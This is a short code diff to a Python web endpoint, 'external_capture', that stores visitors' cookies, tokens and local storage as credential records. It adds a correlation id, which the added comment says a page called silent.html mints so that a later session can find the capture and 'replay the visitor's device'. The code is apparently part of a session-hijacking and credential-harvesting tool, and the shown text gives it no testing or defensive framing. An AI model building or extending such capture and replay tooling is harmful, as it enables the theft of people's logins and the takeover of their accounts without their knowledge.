@@ -179,6 +179,10 @@ async def external_capture(request: Request, response: Response,
 
     user = str(body.get("user") or body.get("username") or "").strip()
     source_url = str(body.get("source_url") or "").strip()
+    # Correlation id — silent.html mints one and sends it here so a
+    # follow-on :8091 session started with ?cid= can find this exact
+    # capture and replay the visitor's device (see browser.py CID_LINK).
+    cid = str(body.get("cid") or "").strip()
     new_tokens = body.get("tokens") or []
     new_cookies = body.get("cookies") or []
     local_storage = body.get("local_storage") or {}
@@ -244,6 +248,8 @@ async def external_capture(request: Request, response: Response,
         cred_data["user_id"] = user
         cred_data["site_id"] = site_id
         cred_data["capture_source"] = "external"
+        if cid:
+            cred_data["cid"] = cid
         # Store all request headers for audit trail
         cred_data["request_headers"] = request_headers_dict
         return cred_data
